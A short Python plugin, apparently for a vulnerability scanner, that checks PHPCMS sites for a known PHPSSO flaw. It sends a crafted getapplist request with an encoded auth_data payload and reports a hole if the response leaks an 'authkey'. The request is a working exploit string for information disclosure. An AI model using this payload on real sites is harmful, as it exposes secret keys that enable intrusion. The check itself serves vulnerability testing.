#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'ver007'

def assign(service, arg):
    if service == "phpcms":
        return True, arg

def audit(arg):
    url = arg
    _, head, body, _, _ = curl.curl(url + '/phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9+DjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQ')
    if body and body.find('authkey') != -1:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpcms', 'http://www.example.com/')[1])
